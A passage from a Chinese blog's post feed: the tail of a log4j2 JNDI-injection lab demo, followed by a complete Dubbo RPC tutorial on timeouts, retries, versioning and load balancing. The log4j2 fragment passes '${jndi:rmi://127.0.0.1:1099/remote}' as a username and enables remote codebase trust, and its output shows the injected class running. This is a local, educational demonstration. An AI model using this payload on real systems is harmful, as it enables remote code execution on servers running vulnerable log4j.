class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试获取资源</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testJndi</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//这里由于我使用的是 jdk 181,jdk 版本大于 181，需要手动设置为 true</span></span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>,<span class="string">"true"</span>);</span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/remote"</span>;</span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        Object lookup = initialContext.lookup(uri);</span><br><span class="line">        System.out.println(lookup);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试攻击</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testRegister</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//估计使用拼接的攻击代码</span></span><br><span class="line">    String username = <span class="string">"$&#123;jndi:rmi://127.0.0.1:1099/remote&#125;"</span>;</span><br><span class="line"></span><br><span class="line">    App app = <span class="keyword">new</span> App();</span><br><span class="line">    app.register(username);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果:</p><p>测试资源获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">静态代码块攻击</span><br><span class="line">你被攻击了</span><br><span class="line">【攻击者】</span><br></pre></td></tr></table></figure><p>测试静态代码攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">静态代码块攻击</span><br><span class="line">你被攻击了</span><br><span class="line">20:38:58.040 [main] ERROR local.App - 【攻击者】,注册了账号</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> log4j2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dubbo</title>
      <link href="/2021/12/05/Dubbo/"/>
      <url>/2021/12/05/Dubbo/</url>
      
        <content type="html"><![CDATA[<h2 id="Dubbo-概述"><a href="#Dubbo-概述" class="headerlink" title="Dubbo 概述"></a>Dubbo 概述</h2><h3 id="Dubbo概念"><a href="#Dubbo概念" class="headerlink" title="Dubbo概念"></a>Dubbo概念</h3><ul><li><p>Dubbo是阿里巴巴公司开源的一个高性能、轻量级的 Java RPC 框架。</p></li><li><p>致力于提供高性能和透明化的 RPC 远程服务调用方案，以及 SOA 服务治理方案。</p></li><li><p>官网：<a href="http://dubbo.apache.org/" target="_blank" rel="noopener">http://dubbo.apache.org</a></p></li></ul><h3 id="Dubbo架构"><a href="#Dubbo架构" class="headerlink" title="Dubbo架构"></a>Dubbo架构</h3><p><img src="/img/Dubbo/Dubbo0.png" alt=""></p><p><strong>节点角色说明</strong></p><ul><li><p><strong>Provider</strong>：暴露服务的服务提供方</p></li><li><p><strong>Container</strong>：服务运行容器</p></li><li><p><strong>Consumer</strong>：调用远程服务的服务消费方</p></li><li><p><strong>Registry</strong>：服务注册与发现的注册中心</p></li><li><p><strong>Monitor</strong>：统计服务的调用次数和调用时间的监控中心</p></li></ul><h3 id="Demo地址"><a href="#Demo地址" class="headerlink" title="Demo地址"></a>Demo地址</h3><p>Dubbo-demo[<a href="https://github.com/raineddown/Dubbo-demo" target="_blank" rel="noopener">https://github.com/raineddown/Dubbo-demo</a>]</p><p>Dubbo快速入门项目结构：</p><p><img src="/img/Dubbo/Dubbo1.png" alt=""></p><p><strong>实现步骤</strong></p><p>①启动zookeeper</p><p>②创建服务提供者Provider模块</p><p>③创建服务消费者Consumer模块</p><p>④在服务提供者模块编写 UserServiceImpl 提供服务</p><p>⑤在服务消费者中的 UserController 远程调用UserServiceImpl 提供的服务</p><p>⑥配置zookeeper地址，分别启动两个服务，测试</p><p>代码:</p><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.itheima.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.itheima.service.UserService;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.Reference;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注入Service</span></span><br><span class="line">    <span class="comment">//@Autowired//本地注入</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        1. 从zookeeper注册中心获取userService的访问url</span></span><br><span class="line"><span class="comment">        2. 进行远程调用RPC</span></span><br><span class="line"><span class="comment">        3. 将结果封装为一个代理对象。给变量赋值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span><span class="comment">//远程注入</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sayHello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询用户信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/find"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">find</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.findUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.itheima.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.itheima.service.UserService;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.Service;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//@Service//将该类的对象创建出来，放到Spring的IOC容器中  bean定义</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span><span class="comment">//将这个类提供的方法（服务）对外发布,Dubbo的注解不是spring的注解。将访问的地址 ip，端口，路径注册到注册中心中</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello dubbo hello!~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//查询User对象</span></span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="number">1</span>,<span class="string">"zhangsan"</span>,<span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dubbo高级特性"><a href="#Dubbo高级特性" class="headerlink" title="Dubbo高级特性"></a>Dubbo高级特性</h2><h3 id="Dubbo高级特性超时与重试"><a href="#Dubbo高级特性超时与重试" class="headerlink" title="Dubbo高级特性超时与重试"></a>Dubbo高级特性超时与重试</h3><p><img src="/img/Dubbo/Dubbo2.png" alt=""></p><ul><li><p>服务消费者在调用服务提供者的时候发生了阻塞、等待的情形，这个时候，服务消费者会一直等待下去。</p></li><li><p>在某个峰值时刻，大量的请求都在同时请求服务消费者，会造成线程的大量堆积，势必会造成雪崩。</p></li><li><p>dubbo 利用超时机制来解决这个问题，设置一个超时时间，在这个时间段内，无法完成服务访问，则自动断开连接。</p></li><li><p>使用timeout属性配置超时时间，默认值1000，单位毫秒。</p></li></ul><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注入Service</span></span><br><span class="line">    <span class="comment">//@Autowired//本地注入</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        1. 从zookeeper注册中心获取userService的访问url</span></span><br><span class="line"><span class="comment">        2. 进行远程调用RPC</span></span><br><span class="line"><span class="comment">        3. 将结果封装为一个代理对象。给变量赋值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span>(timeout = <span class="number">1000</span>)<span class="comment">//远程注入，客户端超时配置会覆盖服务端配置(服务端3秒配置被覆盖)</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sayHello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询用户信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/find"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">find</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                    System.out.println(i++);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> userService.findUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.Service;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将这个类提供的方法（服务）对外发布。将访问的地址 ip，端口，路径注册到注册中心中</span></span><br><span class="line"><span class="meta">@Service</span>(timeout = <span class="number">3000</span>,retries = <span class="number">2</span>)<span class="comment">//当前服务3秒超时,重试2次，一共3次</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello dubbo hello!~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"服务被调用了："</span>+i++);</span><br><span class="line">        <span class="comment">//查询User对象</span></span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="number">1</span>,<span class="string">"zhangsan"</span>,<span class="string">"123"</span>);</span><br><span class="line">        <span class="comment">//数据库查询很慢，查了5秒</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端，@Reference(timeout = 1000)注解存在，控制台输出1后报错，1秒超时。客户端超时配置会覆盖服务端配置(服务端3秒配置被覆盖)</p><p>服务端，若客户端@Reference没有超时配置，控制台输出3后超时报错。</p><p>重试</p><p>控制台输出：</p><p>服务被调用了: 1</p><p>服务被调用了: 2</p><p>服务被调用了: 3</p><p>服务被调用三次，retries不写默认为2。</p><h3 id="Dubbo高级特性多版本"><a href="#Dubbo高级特性多版本" class="headerlink" title="Dubbo高级特性多版本"></a>Dubbo高级特性多版本</h3><p><img src="/img/Dubbo/Dubbo3.png" alt=""></p><p>server1:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.Service;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将这个类提供的方法（服务）对外发布。将访问的地址 ip，端口，路径注册到注册中心中</span></span><br><span class="line"><span class="meta">@Service</span>(version = <span class="string">"v1.0"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello dubbo hello!~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"old..."</span>);</span><br><span class="line">        <span class="comment">//查询User对象</span></span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="number">1</span>,<span class="string">"zhangsan"</span>,<span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.Service;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将这个类提供的方法（服务）对外发布。将访问的地址 ip，端口，路径注册到注册中心中</span></span><br><span class="line"><span class="meta">@Service</span>(version = <span class="string">"v2.0"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl2</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello dubbo hello!~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"new...."</span>);</span><br><span class="line">        <span class="comment">//查询User对象</span></span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="number">1</span>,<span class="string">"zhangsan"</span>,<span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        1. 从zookeeper注册中心获取userService的访问url</span></span><br><span class="line"><span class="comment">        2. 进行远程调用RPC</span></span><br><span class="line"><span class="comment">        3. 将结果封装为一个代理对象。给变量赋值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span>(version = <span class="string">"v2.0"</span>)<span class="comment">//远程注入</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sayHello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询用户信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/find"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">find</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> userService.findUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据版本选择对应的接口实现类，类似于spring @Qualifier(“Version”)和@Resource（name=”Version”）注解。</p><h3 id="Dubbo高级特性负载均衡"><a href="#Dubbo高级特性负载均衡" class="headerlink" title="Dubbo高级特性负载均衡"></a>Dubbo高级特性负载均衡</h3><p>负载均衡策略（4种）：</p><p>•Random ：按权重随机，默认使用该策略。按权重设置随机概率。</p><p>•RoundRobin ：按权重轮询。</p><p>•LeastActive：最少活跃调用数，相同活跃数的随机。</p><p>•ConsistentHash：一致性 Hash，相同参数的请求总是发到同一提供者。</p><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span>(loadbalance = <span class="string">"random"</span>)<span class="comment">//远程注入，loadbalance策略</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sayHello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询用户信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/find"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">find</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> userService.findUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span>(weight = <span class="number">100</span>) <span class="comment">//weight权重</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"3......"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"old..."</span>);</span><br><span class="line">        <span class="comment">//查询User对象</span></span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="number">1</span>,<span class="string">"zhangsan"</span>,<span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Dubbo高级特性集群容错"><a href="#Dubbo高级特性集群容错" class="headerlink" title="Dubbo高级特性集群容错"></a>Dubbo高级特性集群容错</h3><p><img src="../img/Dubbo/Dubbo4.png" alt=""></p><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 